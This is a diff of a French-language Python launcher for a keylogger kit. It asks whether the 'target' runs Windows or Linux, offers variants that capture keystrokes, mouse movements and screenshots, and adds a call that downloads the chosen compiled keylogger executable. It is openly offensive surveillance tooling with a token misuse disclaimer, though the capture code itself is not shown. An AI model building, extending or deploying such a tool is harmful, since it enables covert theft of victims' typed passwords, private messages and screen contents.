@@ -1,11 +1,16 @@
 import time
 import os
-from DownloadCompile import download
+import pygame
+from DownloadCompile.download import downloadFileCompile
 
 if os.name == 'nt':
     os.system("cls")
 else:
     os.system("clear")
+
+pygame.mixer.init()
+pygame.mixer.music.load("music/gow.mp3")
+pygame.mixer.music.play()
 
 #---------DÉBUT AFFICHAGE DU NOM-----------------------
 
@@ -46,13 +51,12 @@ I am not responsible for any misuse. Use them responsibly and ethically.
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣿⣿⣷⣯⣿⣛⣯⣽⣯⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-                                                               
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿                    
     """
 
     for line in keylogger_art.splitlines():
         print(line)
-        time.sleep(0.2)
+        time.sleep(0.1)
 
 print_keylogger()
 
@@ -61,12 +65,12 @@ print_keylogger()
 
 #----------DÉBUT RÉCOLTE INFOS DES MACHINES----------------
 
-print("[+] Cet outil sert à récolter les touches du clavier, les mouvements de la souris ainsi qu'à faire des captures d'écran de la cible.\n")
-print("[+] Il existe plusieurs version combinant différent type de récolte.")
+print("\033[94m [+] Cet outil sert à récolter les touches du clavier, les mouvements de la souris ainsi qu'à faire des captures d'écran de la cible.\n \033[0m")
+print("\033[94m [+] Il existe plusieurs version combinant différent type de récolte. \n \033[0m")
 
 
 # Affichage du texte en vert sans saut à la ligne
-print("\033[92m[+] Votre cible est sur windows ou linux ? Tapez 1 pour windows ou 2 pour linux\n -->\033[0m", end="")
+print("\033[92m [+] Votre cible est sur windows ou linux ? Tapez 1 pour windows ou 2 pour linux -->\033[0m", end="")
 
 # Récupérer la saisie de l'utilisateur
 systemeExploitation = int(input())
@@ -94,17 +98,14 @@ while choix not in ['1', '2', '3', '4']:
     choix = input("\033[92mEntrez votre choix (1, 2, 3 ou 4) : \033[0m")
 
 
-
-
-
 if choix=='1':
-    print("\033[92m[+] Vous avez choisi la version du keylogger simple (Effectue la récolte des touches)\033[0m")
+    print("\033[92m[+] Vous avez choisi la version du keylogger simple (Effectue la récolte des touches). Veuillez attendre que l'exécutable se télécharge.\033[0m")
 elif choix=='2':
-    print("\033[92m[+] Vous avez choisi la version du keylogger avec la récolte des mouvements de la souris (Effectue la récolte des touches et des mouvements de la souris)\033[0m")
+    print("\033[92m[+] Vous avez choisi la version du keylogger avec la récolte des mouvements de la souris (Effectue la récolte des touches et des mouvements de la souris). Veuillez attendre que l'exécutable se télécharge.\033[0m")
 elif choix=='3':
-    print("\033[92m[+] Vous avez choisi la version du keylogger avec la capture d'écran (Effectue la récolte des touches ainsi que des captures d'écran)\033[0m")
+    print("\033[92m[+] Vous avez choisi la version du keylogger avec la capture d'écran (Effectue la récolte des touches ainsi que des captures d'écran). Veuillez attendre que l'exécutable se télécharge.\033[0m")
 elif choix=='4':
-    print("\033[92m[+] Vous avez choisi la version du keylogger avec la capture d'écran ainsi que la récolte des mouvements de la souris (Effectue la récolte des touches et des mouvements de la souris ainsi que des captures d'écran)\033[0m")
+    print("\033[92m[+] Vous avez choisi la version du keylogger avec la capture d'écran ainsi que la récolte des mouvements de la souris (Effectue la récolte des touches et des mouvements de la souris ainsi que des captures d'écran). Veuillez attendre que l'exécutable se télécharge.\033[0m")
 
 
 #-----------FIN RÉCOLTE INFOS DES MACHINES---------------
@@ -112,9 +113,6 @@ elif choix=='4':
 
 #-----------DÉBUT INSTALLATION DU BON FICHIER---------------
 
-
-#TODO
-#Mettre le code pour le téléchargement des fichiers compilés
-
+downloadFileCompile(systemeExploitation,choix)
 
 #----------FIN INSTALLATION DU BON FICHIER-----------------
